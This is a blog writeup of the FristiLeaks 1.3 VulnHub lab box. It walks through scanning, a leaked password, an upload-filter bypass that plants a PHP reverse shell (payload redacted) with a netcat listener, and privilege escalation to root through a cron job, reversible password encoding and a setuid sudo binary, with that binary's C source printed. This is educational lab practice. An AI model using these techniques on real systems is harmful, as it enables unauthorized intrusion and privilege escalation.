---
layout: post
title: FristiLeaks 1.3 Writeup
excerpt: FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It's by far one of my favorite VulnHub boxes I've done, as it involves some fun and simple reversing/code analysis. It also involves practice hopping around and enumerating a Linux environment from the perspective of multiple users, and requires some creative thinking.The challenge begins by using some simple guesswork to find a login portal. The source code of this login portal cotains an HTML comment that leaks a base64 encoded image. After decoding the image, we are able to gather the password used to login to web application. We exploit the web application's upload functionality to upload a PHP reverse shell and get a reverse shell. Privilege escalation involves abusing a cronjob, reversing a simple python cryptography algorithm, reusing passwords, and a sudo misconfiguration to finally gather root.
tags: VulnHub
comments: true
social-share: false
---

FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It's by far one of my favorite VulnHub boxes I've done, as it involves some fun _and_ simple reversing/code analysis.

It also involves practice hopping around and enumerating a Linux environment from the perspective of multiple users, and requires some creative thinking.

The challenge begins by using some simple guesswork to find a login portal. The source code of this login portal cotains an HTML comment that leaks a base64 encoded image.

After decoding the image, we are able to gather the password used to login to web application. We exploit the web application's upload functionality to upload a PHP reverse shell and get a reverse shell.

Privilege escalation involves abusing a cronjob, reversing a simple python cryptography algorithm, reusing passwords, _and_ a sudo misconfiguration to finally gather root.

{: .box-note}
**Note About Setup:** For the networking to properly work you'll need to manually set the VMs MAC address to the following: `08:00:27:A5:A6:76` <br/><br/>
This can be done in Virtualbox via: Settings (ctrl +S) -> Network -> Advanced -> Input `080027A5A676` into the _MAC Address_ field.

# Enumeration

Let's start as always with NMAP scans.

```bash
ein@~/VulnHub/FristiLeaks1.3:$ sudo nmap -Pn -p- -sSV -A -oN fristiLeaks1.3_nmap 10.0.0.64
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-01 17:33 EDT
Nmap scan report for 10.0.0.64
Host is up (0.00011s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
```

Interesting, looks like this will be heavily web-based. Let's go ahead and get `Nikto` kicked off.

```bash
ein@~:$ nikto -host 10.0.0.64
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.64
+ Target Hostname:    10.0.0.64
+ Target Port:        80
+ Start Time:         2020-08-01 23:56:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                                             
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                                             
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)                                
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)                                
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)                                
+ "robots.txt" contains 3 entries which should be manually viewed.                                                 
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.                                                                                                              
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.                                                                                          
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE                                                            
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST                                 
+ OSVDB-3268: /icons/: Directory indexing found.                                                                   
+ OSVDB-3268: /images/: Directory indexing found.                                                                  
+ OSVDB-3233: /icons/README: Apache default file found.                                                            
+ 8701 requests: 0 error(s) and 15 item(s) reported on remote host                                                 
+ End Time:           2020-08-01 23:56:35 (GMT-4) (9 seconds)                                                      
---------------------------------------------------------------------------                                        
+ 1 host(s) tested                                                                                                 
```

I'll  enumerate a bit using a web browser. We'll start as usual by just browsing to the default landing page.

![Landing Page](/assets/img/VulnHub/Fristi_1.PNG)

Nothing interesting here, let's start looking at the sub-directories that nikto and NMAP picked up.

`/cola/`, `/sisi/`, and `/beer/` all result in the following page:

![cola](/assets/img/VulnHub/Fristi_2.PNG)

This part took me a while, but after thinking about it I simply tried `/fristi` and got the following result:

![Frist admin page](/assets/img/VulnHub/Fristi_3.PNG)

So kinda stupid. IDK, I banged my head against this trying to find some sweet bypass but whatever. Let's keep moving on.

We can start by taking a look at the source code of this login page:

```html
<html>
<head>
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
</head>
<body>
<center><h1> Welcome to #fristileaks admin portal</h1></center>

~~~ REDACTED BASE64 ~~~

<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

I got rid of the meaningless info, namely the image that we saw in the previous screenshot. This reveals a couple things:
- A Base64 Id that is probably the key to our next step
- A username of `eezepz`
- An HTML comment that is base64. 

Cool, let's grab the base64 HTML comment and see what it contains:
```bash
cat HTMLcomment | base64 -d
�PNG
▒
IHDRm4�A�sRGB���gAMA��
                      �a        pHYs���o�dRIDATx^��Qv� �a��
                                                           �z��l&�I%KH�@f45�5��VI
                                                                                 ���s��~���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/�����&������T3h��#3՗j�
                                                                                                                                                                 ��~�ݿ~��2�Z�e��L������ZZUW$�o��y���{K}�f�P����9{�6�X��KKL>����a�%�ZD�
                                                                                                                                                                                                                                      �Ś�B�'��*�%&��Rxg�յ���V3]��#q�pz�R�\Zb�n��   -]�յ���JH5�9r(����I5se��G�tXq"k�6���j�                                  ���6��
F��n�T3W��ג���ߞ���j�                                                          �g=�Yx�i�bѢꍗj�ʒ�H-Y��ʯ��JH5Ӆx�D7(
                    ��ߠ�MI6�������D3�
                                     ������M���JH5ӅZ�l3�GY�d��M▒o6��T�rR�
                                                                         ��/�-��5ӅJ��I,�i9�l�Ѣ��Y��D���![

�o����͹tWK}�f�h�����}d� [��T5!Ռuɘ-��Ӈ������Ӌ,����C-GR��,����kj�\g}<���g.Ռuɘ-��V�_u��Z����#�|��_�A��Ӝ��'c�jƸdЖJ{<7
����9C}�f�P�4��p�]��O���I5c\2hK�G����t��b����#�*�       ��:�����R��J��jƺ$����#+o`���L*9�I:�����,��>��U騢"�3�jƼdȖ�ˆ#۞�����j��)'�zUq��F>L�Z���[Z4���LZ�R}�f�ˑ����S;���|�������f.-������h��FEZ�T_��>�sd�a6�(.�U^n|/�����ZZ��=�#;t����T_��>Trd��+?���8�7�j-�}d��R�t!�#�[/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E�����Z�8�rqIEND�B`�ein@~/VulnHub/FristiLeaks1.3:$ 
```

We get a bunch of binary data, but we can clearly see some `PNG` magic bytes in the beginning there, let's pipe the output to a file:

```bash
cat HTMLcomment | base64 -d >> image.png
```

And viewing the image gives us:

![Decoded image](/assets/img/VulnHub/Fristi_4.PNG)

Nice, this is most likely a password. 

At first glance I thought it was maybe a cleartext password migrated to an esoteric language, like [brainfuck](https://en.wikipedia.org/wiki/Brainfuck).

Looking back, I should have tried the lowest-hanging fruit first. If we go  back to the admin login page and try the following creds: `eezeepz:keKkeKKeKKeKkEkkEk`:

![Successful login](/assets/img/VulnHub/Fristi_5.PNG)

We have a successful login. Nice.

# Exploitation

Let's begin to check out the file upload mechanism on the webpage:

```bash
Uploading, please wait
The file has been uploaded to /uploads 
```

And trying to upload a random file type gives us this:

```
Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded 
```

Cool, let's try uploading a PHP reverse shell by simply changing the file name using Burp. For our purposes we'll use the PHP web shell located on Kali in `/usr/share/webshells/php`.

```bash
POST /fristi/do_upload.php HTTP/1.1
Host: fristi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://fristi/fristi/upload.php
Content-Type: multipart/form-data; boundary=---------------------------1741988992628995641674019453
Content-Length: 5862
Connection: close
Cookie: PHPSESSID=ri1lakotitu9ijlqn0ua4gheh5
Upgrade-Insecure-Requests: 1

-----------------------------1741988992628995641674019453
Content-Disposition: form-data; name="fileToUpload"; filename="php-reverse-shell.php.gif"
Content-Type: application/x-php

~~~ REDACTED ~~~

```

As you can see, we simply added `.gif` to the end of the `filename=` parameter. This successfully bypasses the control and uploads our file.

I'll go ahead and setup the listener I specified in the reverse shell (for me this was done via `rlwrap nc -nvlp 6969`) and browse to `/fristi/fristi/uploads/php-reverse-shell.php.gif`.

And we get a shell:

![Successful login](/assets/img/VulnHub/Fristi_6.PNG)

# Privilege Escalation

Moving on to privesc the first thing to note is that we are the `Apache` user. 

With this in mind let's check out the webserver directory to see if there's anything we can see on the backend:

```bash
ls -la /var/www
total 28
drwxr-xr-x.  6 root root 4096 Nov 17  2015 .
drwxr-xr-x. 19 root root 4096 Nov 19  2015 ..
drwxr-xr-x.  2 root root 4096 Aug 24  2015 cgi-bin
drwxr-xr-x.  3 root root 4096 Nov 17  2015 error
drwxr-xr-x.  7 root root 4096 Nov 25  2015 html
drwxr-xr-x.  3 root root 4096 Nov 17  2015 icons
-rw-r--r--   1 root root   98 Nov 17  2015 notes.txt
```

Hmmm... let's see what `notes.txt` says:

```bash
cat notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

Okay, following the breadcrumbs:

```bash
ls -la /home/eezeepz
total 2608
drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 .
drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old
-rw-r--r--. 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
-rwxr-xr-x. 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
-rwxr-xr-x. 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
-rwxr-xr-x. 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
-rwxr-xr-x. 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
-rwxr-xr-x. 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
-rwxr-xr-x. 1 eezeepz eezeepz  52936 Nov 17  2015 chgrp
-rwxr-xr-x. 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
-rwxr-xr-x. 1 eezeepz eezeepz  48712 Nov 17  2015 chmod
-rwxr-xr-x. 1 eezeepz eezeepz  53640 Nov 17  2015 chown
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 clock
-rwxr-xr-x. 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
-rwxr-xr-x. 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
-rwxr-xr-x. 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
-rwxr-xr-x. 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
-rwxr-xr-x. 1 eezeepz eezeepz  41704 Nov 17  2015 cut
-rwxr-xr-x. 1 eezeepz eezeepz  14832 Nov 17  2015 halt
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 hostname
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
-rwxr-xr-x. 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
-rwxr-xr-x. 1 eezeepz eezeepz  11576 Nov 17  2015 kill
-rwxr-xr-x. 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
-rwxr-xr-x. 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
-rwxr-xr-x. 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
-rwxr-xr-x. 1 eezeepz eezeepz 171784 Nov 17  2015 nano
-rwxr-xr-x. 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
-rwxr-xr-x. 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
-rwxr-xr-x. 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
-rwxr-xr-x. 1 eezeepz eezeepz  25208 Nov 17  2015 nice
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
-rwxr-xr-x. 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
-rwxr-xr-x. 1 eezeepz eezeepz 390616 Nov 17  2015 tar
-rwxr-xr-x. 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
-rwxr-xr-x. 1 eezeepz eezeepz 249000 Nov 17  2015 tc
-rwxr-xr-x. 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
-rwxr-xr-x. 1 eezeepz eezeepz  47928 Nov 17  2015 touch
-rwxr-xr-x. 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
-rwxr-xr-x. 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
-rwxr-xr-x. 1 eezeepz eezeepz  21112 Nov 17  2015 true
-rwxr-xr-x. 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
-rwxr-xr-x. 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
-rwxr-xr-x. 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
-rwxr-xr-x. 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
-rwxr-xr-x. 1 eezeepz eezeepz     62 Nov 17  2015 zcat
-rwxr-xr-x. 1 eezeepz eezeepz  47520 Nov 17  2015 zic
```

Dang, tons of crap in here. But hey, there's another `notes.txt`, let's see what this one says:

```bash
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

Okay cool! So basically we can run `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, and `egrep` as Jerry.. whose username is `admin` on the box itself.

Following his directions, we'll create a file called `runthis` in `/tmp`... Inside of it we can put one of those binary commands.

Looking at our options, I think our best bet would be to use `chmod` to allow us access to Jerry's home directory. We can do this via:

```bash
echo "/home/admin/chmod 777 /home/admin" >> /tmp/runthis
```

And after waiting a minute or so, we can see the following inside of cronresult:

```bash
executing: /home/admin/chmod 777 /home/admin
```

Cool! Let's go take a look:

```bash
ls -la /home/admin
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
-rw-r--r--. 1 admin     admin         18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 admin     admin        176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 admin     admin        124 Sep 22  2015 .bashrc
-rwxr-xr-x  1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x  1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r--  1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r--  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r--  1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x  1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x  1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x  1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
```

There are a couple files that look interesting. Let's start by analyzing `cryptedpass.txt` and `cryptpass.py`:

#### cryptedpass.txt:

```bash
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
```

#### cryptpass.py:

```python
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

Okay cool. So we have some ciphertext and the funciton that creates it. Let's unpack what `cryptpass.py` is doing.

- First it takes a string (`str`) and base64 encodes it. Pretty simple.
- Next, it uses the `codecs.encode` function to perform a rot13 substitution on the base64 encoded text. 
- But wait, what's the `[::-1]` thing attached to the `base64string` string? Turns out this is simply reversing the string.

Okay cool... So knowing what the script does, if we simply reverse the steps, we should get the cleartext password. I used the following command to get the cleartext password:

```bash
ein@~/VulnHub/FristiLeaks1.3:$ echo "mVGZ3O3omkJLmy2pcuTq" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' | rev | base64 -d
thisisalsopw123
```

Cool, now let's try logging in as admin using this password:

```bash
bash-4.1$ su admin
su admin
Password: thisisalsopw123

[admin@localhost .secret_admin_stuff]$ id
id
uid=501(admin) gid=501(admin) groups=501(admin)
[admin@localhost .secret_admin_stuff]$ 
```

Nice! 

Looking through our home directory there's still the `whoisyourgodnow.txt` file owned by `fristigod`:

```bash
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```

Hmm.... Wonder if this uses the same algorithm we just reversed?

```bash
ein@~/VulnHub/FristiLeaks1.3:$ echo "=RFn0AKnlMHMPIzpyuTI0ITG" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' | rev | base64 -d
LetThereBeFristi!
```

Sure does!

Let's hop over to this user and see what's in their home directory:

```bash
[admin@localhost ~]$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ cd ~
cd ~
bash-4.1$ ls -la
ls -la
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
bash-4.1$ 
```

Hmm.. what's in the `.secret_admin_stuff` directory?

```bash
cd .secret_admin_stuff
bash-4.1$ ls -la
ls -la
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .
drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom
bash-4.1$ 
```

An executable named `doCom`. Let's see what happens when we try to run it:

```bash
./doCom
Nice try, but wrong user ;)
bash-4.1$ 
```

Huh. Maybe we need to use some sort of `sudo` trick to pass it a certain UID?

Before we get too deep, let's use `strings` to see what's hiding inside the binary:

```bash
strings doCom
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setuid
exit
strcat
stderr
system
getuid
fwrite
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
Nice try, but wrong user ;)
Usage: ./program_name terminal_command ...
```

Interesting, looks like it's using `setuid` and is written in C. Let's check the sudo configuration for `fristigod` using `sudo -l`:

```bash
sudo -l 
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

Oh nice, so we can run this script as `fristi`. One thing to note here is that the declared script is stored in a different directory than our home directory. It's in `/var/fristigod/`.

Cool, let's see what happens when we try to run it using sudo: 

{: .box-note}
**Note:** make sure to supply the full path when using `sudo -u`

#### Running doCom with sudo -u:

```bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
Usage: ./program_name terminal_command ...
```

So the output denotes that it takes a terminal command as a positional argument. Okay, let's try giving it a command:

```bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```

Oh sweet, we have a UID of 0. Let's simply `su` to root:

```bash
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom su root
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom su root
[root@localhost fristigod]# id && whoami
id && whoami
uid=0(root) gid=0(root) groups=0(root)
root
[root@localhost fristigod]# 
```

And that's it! Rooted!

```bash
[root@localhost ~]# cat fristileaks_secrets.txt
cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
``` 

Also, if you're curious why the `doCom` binary gives us the root UID instead of `fristi`'s UID, we can see via the source code:

```c
cat doCom.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_CMN_LEN 100

int main(int argc, char *argv[])
{
    char cmd[MAX_CMN_LEN] = "", **p;
    int userID;
    userID = getuid();
    if (userID != 503 )
    {
        fprintf(stderr,"Nice try, but wrong user ;)\n");
        exit(EXIT_FAILURE);
    }
    if (argc < 2) /*no command specified*/
    {
        fprintf(stderr, "Usage: ./program_name terminal_command ...");
        exit(EXIT_FAILURE);
    }
    else
    {
        strcat(cmd, argv[1]);
        for (p = &argv[2]; *p; p++)
        {
            strcat(cmd, " ");
            strcat(cmd, *p);
        }
        setuid(0);
        system(cmd);
    }

    return 0;
}
```

The `setuid(0)` command issues the root UID, hence why we have direct root. Cool!
